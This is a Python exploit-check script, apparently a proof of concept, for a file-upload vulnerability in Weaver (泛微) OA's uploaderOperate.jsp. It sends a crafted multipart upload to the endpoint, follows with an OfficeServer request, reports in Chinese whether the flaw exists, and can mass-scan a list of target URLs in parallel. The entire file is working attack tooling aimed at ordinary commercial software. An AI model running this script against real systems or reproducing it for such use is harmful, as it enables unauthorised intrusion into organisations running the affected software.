import time
import argparse
import requests
import multiprocessing
from rich.console import Console
import urllib3

proxies={'http':'http://127.0.0.1:8080'}
console = Console()
def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())
    
def main(target_url):
    if target_url[:4]!='http':
        target_url = 'http://' + target_url
    if target_url[-1]!='/':
        target_url += '/'
    headers = {
        "Sec-Ch-Ua": '" Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"',
        "Sec-Ch-Ua-Mobile": "?0",
        "Sec-Ch-Ua-Platform": '"macOS"',
        "Upgrade-Insecure-Requests": '1',
        "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Mobile Safari/537.36",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarymVk33liI64J7GQaK",
        "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Connection": "close"
        
    }
    exp_url=target_url+"workrelate/plan/util/uploaderOperate.jsp"
    vuln_url=target_url+'OfficeServer'
    data='''------WebKitFormBoundarymVk33liI64J7GQaK
Content-Disposition: form-data; name="secId"
1
------WebKitFormBoundarymVk33liI64J7GQaK
Content-Disposition: form-data; name="Filedata"; filename="testlog.txt"
Test
------WebKitFormBoundarymVk33liI64J7GQaK
Content-Disposition: form-data; name="plandetailid"
1
------WebKitFormBoundarymVk33liI64J7GQaK'''
    exp='''Content-Type: multipart/form-data; boundary=----WebKitFormBoundarymVk33liI64J7GQaK
Content-Length: 207
------WebKitFormBoundarymVk33liI64J7GQaK
Content-Disposition: form-data; name="aaa"
{'OPTION':'INSERTIMAGE','isInsertImageNew':'1','imagefileid4pic':'20462'}
------WebKitFormBoundarymVk33liI64J7GQaK'''
    


    console.print(now_time() + " [INFO]     正在泛微 OA uploaderOperate.jsp 文件上传漏洞#2022", style='bold blue')
    try:
        response1=requests.post(exp_url, headers=headers,data=data,verify=False)
        response2=requests.post(vuln_url, headers=headers,data=exp,verify=False)
        if response1.status_code== 200 and response2.status_code== 200:
            console.print(now_time() + ' [SUCCESS]  泛微 OA uploaderOperate.jsp 文件上传漏洞存在 #2022', style='bold green')
            console.print(now_time() + ' [SUCCESS]  详细https://tvd.wuthreat.com/#/listDetail?TVDID=TVD-2022-15578', style='bold green')
        else:
            console.print(now_time() + ' [WARNING]  泛微2022 OA uploaderOperate.jsp 文件上传漏洞不存在', style='bold red ')
    except:
        console.print(now_time() + ' [WARNING]  目标连接超时，或者目标不存在', style='bold red ')
if __name__ == "__main__":
    try:
        parser = argparse.ArgumentParser()
        parser.add_argument('-u', '--url', dest='url', help='Target Url')
        parser.add_argument('-f', '--file', dest='file', help='Target Url File', type=argparse.FileType('r'))
        args = parser.parse_args()
        if args.file:
            pool = multiprocessing.Pool()
            for url in args.file:
                pool.apply_async(main, args=(url.strip('\n'),))
            pool.close()
            pool.join()
        elif args.url:
            main(args.url)
        else:
            print('缺少URL目标, 请使用 [-u URL] or [-f FILE]')
    except KeyboardInterrupt:
        console.print('\nCTRL+C 退出', style='reverse bold red')

    